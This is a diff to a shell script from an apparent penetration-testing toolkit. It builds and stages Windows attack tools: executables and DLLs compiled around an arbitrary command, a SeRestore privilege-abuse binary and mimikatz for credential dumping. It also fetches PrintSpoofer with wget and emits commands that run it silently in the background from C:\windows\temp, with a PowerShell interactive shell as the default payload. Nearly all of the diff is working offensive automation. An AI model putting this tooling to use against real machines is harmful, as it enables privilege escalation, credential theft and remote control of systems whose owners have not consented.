@@ -130,12 +130,15 @@ create_run_windows_exe() {
     if [ ! -z "$1" ]; then
         command="$1"
     fi
+    if [ -z "$run_windows_filename" ]; then
+        run_windows_filename="run_windows"
+    fi
     command=$(escape_sed "$command")
-    cp "$SCRIPTDIR/../c/run_windows.c" run_windows.c
+    cp "$SCRIPTDIR/../c/run_windows.c" $run_windows_filename.c
 
-    sed -E -i 's/\{command\}/'"$command"'/g' run_windows.c
-    x86_64-w64-mingw32-gcc -o run_windows.exe run_windows.c
-    generate_windows_download "run_windows.exe"
+    sed -E -i 's/\{command\}/'"$command"'/g' $run_windows_filename.c
+    x86_64-w64-mingw32-gcc -o $run_windows_filename.exe $run_windows_filename.c
+    generate_windows_download "$run_windows_filename.exe"
 }
 
 create_run_windows_dll() {
@@ -148,9 +151,22 @@ create_run_windows_dll() {
     cp "$SCRIPTDIR/../c/run_windows_dll.cpp" run_windows_dll.cpp
     sed -E -i 's/\{command\}/'"$command"'/g' run_windows_dll.cpp
     x86_64-w64-mingw32-gcc -shared -o run_windows.dll run_windows_dll.cpp
+    generate_windows_download "run_windows.dll"
 }
 
-get_mimikatz() {
+create_se_restore_abuse() {
+    cp "$SCRIPTDIR/../c/SeRestoreAbuse.cpp" .
+    x86_64-w64-mingw32-gcc -o SeRestoreAbuse.exe SeRestoreAbuse.cpp -lstdc++ -static
+    generate_windows_download "SeRestoreAbuse.exe"
+}
+
+create_restart_windows() {
+    cp "$SCRIPTDIR/../c/RestartWindows.cpp" .
+    x86_64-w64-mingw32-gcc -o RestartWindows.exe RestartWindows.cpp -lstdc++ -static
+    generate_windows_download "RestartWindows.exe"
+}
+
+download_mimikatz() {
     cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
     generate_windows_download "mimikatz.exe"
 }
@@ -215,13 +231,21 @@ perform_printspoofer() {
     if [[ ! -f "printspoofer.exe" ]]; then
         echo "Downloading PrintSpoofer..." >> $trail_log
         wget "$printspoofer_url" -O printspoofer.exe >> $trail_log
-    fi
-    echo 'cd C:\windows\temp;'
+    fi    
+    temp_dir="C:\windows\temp"
+    echo "cd $temp_dir;"
     generate_windows_download "printspoofer.exe"
     if [[ -z "$cmd" ]]; then
         cmd=$(get_powershell_interactive_shell)
     fi
-    echo ".\printspoofer.exe -c \"$cmd\""
+    if [[ -z "$run_in_background" ]]; then
+        run_in_background="true"
+    fi
+    if [[ "$run_in_background" == "true" ]]; then
+        echo "cmd /c \"start /b $temp_dir\printspoofer.exe -c \"\"$cmd\"\"\""
+    else
+        echo ".\printspoofer.exe -c \"$cmd\""
+    fi
 }
 
 
